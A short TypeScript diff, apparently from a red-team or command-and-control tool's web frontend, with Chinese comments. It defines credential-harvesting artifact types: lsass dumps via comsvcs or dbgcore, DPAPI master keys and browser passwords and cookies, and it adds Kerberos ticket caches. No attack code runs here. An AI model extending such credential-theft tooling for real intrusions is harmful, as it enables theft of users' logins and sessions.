@@ -7,7 +7,8 @@ import request from '@/utils/request'
 //   lsass   内存转储：二进制大制品，服务端只校验形态，操作员本地解析
 //   dpapi   DPAPI 主密钥集（ZIP）：用户作用域已解密的 masterkey
 //   browser 浏览器口令与 Cookie（JSON）：客户端内存解密，服务端自动入库到凭据库
-export type CredKind = 'lsass' | 'dpapi' | 'browser'
+//   ticket  Kerberos 票据缓存（ZIP）：MIT ccache 文件，服务端解析 principal/到期后入库
+export type CredKind = 'lsass' | 'dpapi' | 'browser' | 'ticket'
 
 export interface CredArtifactRequest {
   uid: string
@@ -37,6 +38,7 @@ export const CRED_TECHS: Record<CredKind, string[]> = {
   lsass: ['auto', 'comsvcs', 'dbgcore'],
   dpapi: ['keys'],
   browser: ['all', 'chrome', 'edge', 'firefox'],
+  ticket: ['files'],
 }
 
 // 类型 → 默认技术（与服务端 cred.DefaultTech 一致）
